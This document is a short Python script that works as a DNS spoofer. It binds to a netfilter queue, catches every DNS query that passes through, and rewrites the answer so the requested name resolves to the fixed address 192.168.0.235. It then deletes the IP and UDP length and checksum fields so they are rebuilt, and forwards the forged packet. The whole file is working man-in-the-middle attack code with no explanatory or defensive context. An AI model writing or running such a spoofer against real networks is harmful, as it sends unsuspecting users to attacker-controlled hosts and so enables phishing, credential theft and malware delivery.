#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSQR):
        print("[+]Receive")
        answer = scapy.DNSRR(rrname = scapy_packet[scapy.DNSQR].qname, rdata = "192.168.0.235")
        scapy_packet[scapy.DNS].an = answer
        scapy_packet[scapy.DNS].ancount = 1

        del scapy_packet[scapy.IP].len 
        del scapy_packet[scapy.IP].chksum 
        del scapy_packet[scapy.UDP].chksum 
        del scapy_packet[scapy.UDP].len 

        packet.set_payload(bytes(scapy_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()